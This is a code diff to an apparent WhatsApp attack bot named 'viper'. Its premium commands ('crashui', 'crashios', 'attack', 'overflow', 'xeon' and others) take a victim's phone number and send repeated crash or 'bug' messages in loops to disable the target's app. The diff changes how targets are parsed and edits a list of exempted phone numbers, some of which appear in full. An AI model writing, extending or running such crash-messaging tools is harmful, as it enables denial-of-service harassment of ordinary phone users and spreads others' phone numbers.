@@ -2136,27 +2136,13 @@ break
 case 'xdroid': case 'xbeta': case 'crashui': 
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
-victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(Xreturn);
-  if (victim == "6283809358811") {
-    return;
-    }
-    if (victim == "6285929014979") {
-    return;
-    }
-  if (contactInfo.length == 0) {
-    return reply("The number is not registered on WhatsApp");
-  }
-  
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
 sendQP(target, wanted);
 await sendQP(target, wanted);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
 await sendSessionStructure(target, wanted);
 await beta1(viper, target);
 darkphonk = fs.readFileSync('./database/suki.mp3')
@@ -2171,27 +2157,13 @@ break
 case 'fuck': case 'tzy': 
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
-victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(Xreturn);
-  if (victim == "6283809358811") {
-    return;
-    }
-    if (victim == "6285929014979") {
-    return;
-    }
-  if (contactInfo.length == 0) {
-    return reply("The number is not registered on WhatsApp");
-  }
-
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
 sendQP(target, wanted);
 await sendQP(target, wanted);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
 await sendSessionStructure(target, wanted);
 await beta1(viper, target);
 }
@@ -2207,27 +2179,13 @@ break
 case 'vip': case 'attack': case 'andro': 
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
-victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(Xreturn);
-  if (victim == "6283809358811") {
-    return;
-    }
-    if (victim == "6285929014979") {
-    return;
-    }
-  if (contactInfo.length == 0) {
-    return reply("The number is not registered on WhatsApp");
-  }
-
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
 sendQP(target, wanted);
 await sendQP(target, wanted);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
 await sendSessionStructure(target, wanted);
 await beta1(viper, target);
 }
@@ -2243,19 +2201,7 @@ break
 case 'crashios': case 'ios': case 'trashios':
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
-victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(Xreturn);
-  if (victim == "6283809358811") {
-    return;
-    }
-    if (victim == "6285929014979") {
-    return;
-    }
-  if (contactInfo.length == 0) {
-    return reply("The number is not registered on WhatsApp");
-  }
-
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, "Punten", 1020000, Ptcp = true);
@@ -2276,27 +2222,13 @@ break
 case 'overflow': case 'vipercrash': case 'crashflow': 
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
-victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(Xreturn);
-  if (victim == "6283809358811") {
-    return;
-    }
-    if (victim == "6285929014979") {
-    return;
-    }
-  if (contactInfo.length == 0) {
-    return reply("The number is not registered on WhatsApp");
-  }
-
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
 sendQP(target, wanted);
 await sendQP(target, wanted);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
 await sendSessionStructure(target, wanted);
 await beta1(viper, target);
 }
@@ -2312,28 +2244,19 @@ break
 case 'xeon':
 if (!isPremium) return reply(mess.only.premium)
 	if (!q) return reply(`Example:\n ${prefix + command} 91xxx`)
-victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(Xreturn);
-  if (victim == "6283809358811") {
-    return;
-    }
-    if (victim == "6285929014979") {
-    return;
-    }
-  if (contactInfo.length == 0) {
-    return reply("The number is not registered on WhatsApp");
-  }
-
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 victim = text.split("|")[0]
 Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 var contactInfo = await viper.onWhatsApp(Xreturn);
-  if (victim == "6283809358811") {
+  if (victim == "916909137213") {
     return;
     }
-    if (victim == "6285929014979") {
+    if (victim == "919366326018") {
     return;
     }
+    if (victim == "919402104401") {
+    return;
+  }
   if (contactInfo.length == 0) {
     return reply("The number is not registered on WhatsApp");
   }
@@ -2716,19 +2639,7 @@ break
 case 'xvip': {
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
-victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(Xreturn);
-  if (victim == "6283809358811") {
-    return;
-    }
-    if (victim == "6285929014979") {
-    return;
-    }
-  if (contactInfo.length == 0) {
-    return reply("The number is not registered on WhatsApp");
-  }
-
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 				let sections = [{
 						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
 						highlight_label: "⚜️⃟ ⌁⃰𝐕𝐢𝐩𝐞͢𝐫ཀ͜͡💫",
